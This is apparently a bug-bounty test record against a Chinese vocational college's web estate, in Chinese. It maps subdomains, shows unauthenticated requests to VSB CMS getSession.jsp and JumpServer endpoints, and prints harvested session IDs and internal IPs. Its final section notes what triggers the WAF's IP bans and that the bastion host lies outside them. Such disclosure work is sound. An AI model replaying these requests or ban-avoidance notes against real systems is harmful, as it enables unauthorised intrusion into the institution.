# 铜川职业技术学院 (tczyxy.net) SRC测试记录 (2026-05-27)

## 资产清单

| 子域名 | IP | 技术栈 | 状态 |
|--------|-----|--------|------|
| www.tczyxy.net | (CERNET) | nginx + VSB CMS 9 | getSession.jsp确认后WAF封IP |
| zsw.tczyxy.net | (CERNET) | nginx + VSB CMS | 同上 |
| sfgl.tczyxy.net | 61.134.55.222/220 | nginx + JumpServer开源堡垒机 | 持续可访问 |
| jwgl.tczyxy.net | (CERNET) | Spring Cloud Gateway (ly-api-gateway:10008) | /api/health/可达，其他被封 |
| zsxt.tczyxy.net | (CERNET) | ASP.NET 4.0.30319 | WAF封IP |
| pan.tczyxy.net | (CERNET) | React SPA + Go后端 | SPA fallback |
| portal → swzx.tczyxy.net | (CERNET) | "事务中心" | CAS认证 |
| cas.tczyxy.net | - | 404 | 不可用 |
| jfpt.tczyxy.net | - | 未探测 | - |
| ydxy.tczyxy.net | - | 404 | 不可用 |
| yx.tczyxy.net | - | 404 | 不可用 |
| zhpj.tczyxy.net | - | 200 | 未深入 |
| zyk.tczyxy.net | - | 200 | 未深入 |
| zy.tczyxy.net | - | 200 | 未深入 |
| old.tczyxy.net | - | 未探测 | - |
| jy.tczyxy.net | - | 200 | 未深入 |

## 确认漏洞

### 1. VSB CMS getSession.jsp 未授权会话获取 [中危]

**域名**: www.tczyxy.net / zsw.tczyxy.net

**首次验证成功**:
```
GET /system/resource/getSession.jsp?r=0.123
→ 200 OK
→ Set-Cookie: JSESSIONID=56FB70A5340626EDAFD66ACFF9B0391C
→ Body: 56FB70A5340626EDAFD66ACFF9B0391C
```

批量获取3个不同session:
- DEB254EDE0BEE212446A0DB3138D9E47
- 95C625479F93434758FCC0E9C31D4ABB
- D45F9C998DBA07A8D430282337874865

getToken.jsp返回 "preview" (CMS预览模式token)

token.js定义接口:
```javascript
function getsession(){
    var url = '/system/resource/getSession.jsp?r=' + Math.random();
    $.ajax({url: url, async:false, success: function(response){sessionid=response;}});
}
function gettoken(mode){
    var url = '/system/resource/getToken.jsp?mode='+ mode+'&r=' + Math.random();
    $.ajax({url: url, async:false, success: function(response){accesstoken=response;}});
}
```

**当前状态**: WAF封IP，整站不可达(000超时)

### 2. JumpServer堡垒机配置信息泄露 [中危]

**域名**: sfgl.tczyxy.net

**端点1 - 系统配置**:
```
GET /api/v1/settings/public/open/
→ 200 OK (无需认证)
→ {"XPACK_ENABLED":false,"INTERFACE":{"login_title":"JumpServer 开源堡垒机","theme":"classic_green",...},"COUNTRY_CALLING_CODES":[...]}
```

**端点2 - 基础设施状态**:
```
GET /api/v1/health/
→ 200 OK (无需认证)
→ {"status":true,"db_status":true,"db_time":0.003,"redis_status":true,"redis_time":0.0006,"time":1779892732}
```

**登录页RSA公钥泄露**:
```
GET /core/auth/login/
→ Set-Cookie: jms_public_key=LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0...
→ Base64解码为2048-bit RSA公钥(用于前端密码加密)
```

### 3. 教务系统信息泄露 [低危]

**域名**: jwgl.tczyxy.net

**Eureka客户端状态**:
```
GET /api/health/
→ {"description":"Spring Cloud Eureka Discovery Client","status":"UP"}
```

**响应头泄露**:
```
x-application-context: ly-api-gateway:10008
```

**内网IP泄露**(config.js):
```javascript
window.previewFileServer = "http://172.198.0.11:5912/";
// fallback:
window.previewFileServer = "http://192.168.35.131:8012/onlinePreview";
```

## 不建议提交

- **jwgl /api/routes/**: 401需认证，不可利用
- **pan.tczyxy.net SPA fallback**: 所有路径返回相同React壳页面
- **zsxt trace.axd**: 403被WAF拦截
- **zsxt web.config.bak**: 403被WAF拦截("网站防火墙")
- **ASP.NET版本泄露**: x-aspnet-version: 4.0.30319 (低危，不收)

## WAF特征

主站使用WAF(可能是宝塔或类似)，触发条件:
- 连续请求getSession.jsp (约10次后)
- 弱密码登录尝试(返回"网站防火墙 - 您的登录所使用的密码为弱密码")
- IP级封禁(整站所有路径超时)

JumpServer (sfgl.tczyxy.net) 在不同IP段(61.134.55.x)，WAF规则独立，不受主站封禁影响。
